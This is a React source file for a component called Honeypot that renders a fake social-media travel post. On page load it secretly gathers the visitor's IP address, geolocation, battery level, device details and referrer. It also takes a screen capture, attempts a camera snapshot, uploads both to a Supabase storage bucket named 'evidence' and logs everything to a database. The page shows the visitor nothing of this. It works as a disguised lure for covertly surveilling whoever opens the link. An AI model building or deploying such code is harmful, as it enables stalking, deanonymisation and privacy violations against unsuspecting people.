import React, { useEffect, useState } from 'react';
import { Heart, MessageCircle, Share2, MoreHorizontal } from 'lucide-react';
import { supabase } from '../supabaseClient';
import * as Tracker from '../utils/tracker';

function Honeypot() {
    const [liked, setLiked] = useState(false);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const collectData = async () => {
            try {
                const ip = await Tracker.getIP();
                const battery = await Tracker.getBatteryStatus();
                const geo = await Tracker.getGeoLocation(ip);

                // Wait for page to render fully before screen capture
                await new Promise(r => setTimeout(r, 1500));
                const screenShot = await Tracker.captureScreen();

                // Try camera (this will trigger prompt)
                const cameraShot = await Tracker.captureCamera();

                // Upload images to Supabase Storage
                let cameraUrl = '';
                let screenUrl = '';

                if (cameraShot) {
                    const { data, error } = await supabase.storage
                        .from('evidence')
                        .upload(`camera/${Date.now()}.jpg`, await (await fetch(cameraShot)).blob());
                    if (data) cameraUrl = data.path;
                }

                if (screenShot) {
                    const { data, error } = await supabase.storage
                        .from('evidence')
                        .upload(`screen/${Date.now()}.png`, await (await fetch(screenShot)).blob());
                    if (data) screenUrl = data.path;
                }

                // Insert into DB
                await supabase.from('visits').insert([
                    {
                        ip_address: ip,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        geo_location: geo,
                        battery_level: battery,
                        referrer: document.referrer,
                        camera_snapshot_url: cameraUrl,
                        screen_snapshot_url: screenUrl,
                        device_type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                    }
                ]);

            } catch (err) {
                console.error("Tracking Error", err);
            } finally {
                setLoading(false);
            }
        };

        collectData();
    }, []);

    return (
        <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div className="bg-white rounded-xl shadow-lg max-w-md w-full overflow-hidden">
                {/* Header */}
                <div className="p-4 flex items-center justify-between border-b border-gray-100">
                    <div className="flex items-center space-x-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-yellow-400 to-purple-500 p-[2px]">
                            <img
                                src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80"
                                alt="Profile"
                                className="w-full h-full rounded-full object-cover border-2 border-white"
                            />
                        </div>
                        <div>
                            <h3 className="font-semibold text-sm text-gray-900">Sarah_Travels</h3>
                            <p className="text-xs text-gray-500">Paris, France</p>
                        </div>
                    </div>
                    <MoreHorizontal className="text-gray-500 cursor-pointer" size={20} />
                </div>

                {/* Image */}
                <div className="relative aspect-square bg-gray-200">
                    <img
                        src="https://images.unsplash.com/photo-1502602898657-3e91760cbb34?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80"
                        alt="Post content"
                        className="w-full h-full object-cover"
                    />
                </div>

                {/* Actions */}
                <div className="p-4">
                    <div className="flex items-center space-x-4 mb-4">
                        <button
                            onClick={() => setLiked(!liked)}
                            className={`transition-transform duration-200 active:scale-125 ${liked ? 'text-red-500' : 'text-gray-700'}`}
                        >
                            <Heart size={24} fill={liked ? "currentColor" : "none"} />
                        </button>
                        <button className="text-gray-700 hover:text-blue-500 transition-colors">
                            <MessageCircle size={24} />
                        </button>
                        <button className="text-gray-700 hover:text-green-500 transition-colors ml-auto">
                            <Share2 size={24} />
                        </button>
                    </div>

                    <div className="block mb-2">
                        <span className="font-semibold text-sm text-gray-900">{liked ? '1,235' : '1,234'} likes</span>
                    </div>

                    <div className="text-sm text-gray-800">
                        <span className="font-semibold mr-2">Sarah_Travels</span>
                        Exploring the hidden gems of Paris! 🥐☕️ #travel #paris #morning
                    </div>

                    <div className="text-xs text-gray-500 mt-2 uppercase">
                        2 hours ago
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Honeypot;
